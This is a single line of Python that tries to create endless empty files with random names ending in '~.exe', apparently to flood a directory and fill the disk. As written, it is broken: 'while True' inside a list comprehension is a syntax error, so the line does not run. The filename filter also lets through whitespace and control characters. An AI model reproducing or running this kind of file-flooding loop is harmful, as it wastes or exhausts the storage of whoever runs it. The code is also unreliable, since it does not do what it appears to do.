import random,string;[open(''.join(random.choice(''.join(c for c in string.printable if c not in '\\/:*?"<>|')) for _ in range(random.randint(1,100)))+'~.exe','wb').close() while True]
